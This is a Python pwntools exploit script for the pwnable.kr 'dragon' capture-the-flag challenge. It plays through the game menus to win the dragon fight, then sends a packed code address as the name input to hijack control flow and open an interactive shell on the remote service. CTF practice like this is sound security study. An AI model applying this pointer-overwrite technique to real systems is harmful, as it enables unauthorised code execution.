#!/usr/bin/env python3
from pwn import *
import struct
import time

def until_print(io, until):
    print(str(io.recvuntil(until), 'utf-8'))

def knight_suicide_with_mama(io):
    print('knight_suicide_with_mama')

    io.sendline('2') # choosing knight

    io.sendline('2')
    io.sendline('2')
    until_print(io, '[ 2 ] Knight')

def knight_suicide_with_baby(io):
    print('knight_suicide_with_baby')

    io.sendline('2') # choosing knight
    print('[+] knight chosen')
    io.sendline('2')
    print('[+] frenzy chosen')
    until_print(io, '[ 2 ] Knight')

def priest_suicide_with_baby(io):
    print('priest_suicide_with_baby')

    io.sendline('1') # choosing priest

    # basically looking for suicide here
    for i in range(0, 2):
        until_print(io, 'You Become Temporarily Invincible.')
        io.sendline('1') # holy bolt

io = remote('pwnable.kr', 9004)
# io = gdb.debug('./dragon','''
#     b * 0x804875f
#     b * 0x804889E
#     c
#     ''')

until_print(io, '[ 2 ] Knight')
knight_suicide_with_baby(io)


io.sendline('1')
until_print(io, 'You Become Temporarily Invincible.')

killed_dragon = False

print('killing dragon...')


io.sendline('3')
io.sendline('3')
io.sendline('2')
io.sendline('3')
io.sendline('3')
io.sendline('2')
io.sendline('3')
io.sendline('3')
io.sendline('2')
io.sendline('3')
io.sendline('3')
io.sendline('2')


data = io.recvuntil(b'The World Will Remember You As:')
print(data)

addr = struct.pack('<I', 0x08048DBF)

# should be enough to also put one
# but just to be safe
# cause im too lazy to debug
# will only debug if it wont work
io.sendline(addr * 4)
io.interactive()
io.close()